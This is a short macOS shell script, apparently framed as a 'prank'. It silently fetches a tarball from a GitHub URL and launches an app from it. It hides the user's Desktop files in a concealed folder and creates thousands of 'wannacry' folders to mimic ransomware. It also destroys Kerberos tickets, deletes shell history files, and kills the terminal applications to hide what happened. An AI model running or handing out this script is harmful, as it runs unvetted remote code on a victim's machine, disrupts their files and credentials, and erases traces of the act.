mkdir -p /tmp/oakoudad/

curl -s -L https://github.com/YelazZ/p1/raw/master/prank.tar.gz -o /tmp/oakoudad/prank.tar.gz > /dev/null

tar xvf /tmp/oakoudad/prank.tar.gz -C /tmp/oakoudad > /dev/null

mkdir ~/.oakoudad/

mv ~/Desktop/* ~/.oakoudad/

cd ~/Desktop

rm -rf ~/.*history*

mkdir wannacry{0..10000}

nohup open /tmp/oakoudad/app/Laz.app > /dev/null

kdestroy
clear
rm -f ~/.*history*

killall iTerm
killall Terminal
killall iTerm2
